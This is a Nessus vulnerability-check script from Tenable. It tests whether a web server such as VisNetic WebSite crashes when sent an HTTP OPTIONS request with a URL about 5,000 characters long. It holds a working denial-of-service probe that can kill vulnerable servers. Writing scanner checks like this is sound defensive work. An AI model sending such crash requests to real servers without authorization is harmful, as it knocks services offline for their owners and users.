#
# (C) Tenable Network Security, Inc.
#

# Some vulnerable servers:
# VisNetic WebSite 3.5.13.1
# 
########################
# References:
########################
#
# Date: Fri, 13 Dec 2002 09:25:00 +0100
# From:"Peter Kruse" <kruse@KRUSESECURITY.DK>
# Subject: VisNetic WebSite Denial of Service
# To:NTBUGTRAQ@LISTSERV.NTBUGTRAQ.COM
#
########################


include("compat.inc");

if(description)
{
 script_id(11235);
 script_version ("$Revision: 1.12 $");
 #script_bugtraq_id(2979);
 #script_cve_id("CVE-2000-0002");
 script_name(english: "Web Server HTTP OPTIONS Method URL Handling Remote Overflow");
 
 script_set_attribute(attribute:"synopsis", value:
"Arbitrary code may be run on the remote web server." );
 script_set_attribute(attribute:"description", value:
"It may be possible to make the web server crash or even 
execute arbitrary code by sending it a too long URL through
the OPTIONS method." );
 script_set_attribute(attribute:"solution", value:
"Upgrade your web server." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:M/Au:N/C:C/I:C/A:C" );

script_end_attributes();

 script_summary(english: "Web server OPTIONS buffer overflow");
 script_category(ACT_DENIAL); 
# All the www_too_long_*.nasl scripts were first declared as 
# ACT_DESTRUCTIVE_ATTACK, but many web servers are vulnerable to them:
# The web server might be killed by those generic tests before Nessus 
# has a chance to perform known attacks for which a patch exists
# As ACT_DENIAL are performed one at a time (not in parallel), this reduces
# the risk of false positives.
 script_copyright(english: "This script is Copyright (C) 2003-2009 Tenable Network Security, Inc.");
 script_family(english: "Web Servers");
 script_dependencie("httpver.nasl", "http_version.nasl");
 script_require_ports("Services/www",80);
 script_require_keys("Settings/ParanoidReport");
 exit(0);
}

#
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

if (report_paranoia < 2) exit(0);

port = get_http_port(default:80, embedded: 1);
if(http_is_dead(port:port))exit(0);

r = http_send_recv3(port: port, method: 'OPTIONS', item: strcat('/', crap(5001), '.html'));

if(http_is_dead(port: port, retry: 3))
{
  security_hole(port);
  # set_kb_item(name:"www/too_long_url_crash", value:TRUE);
}
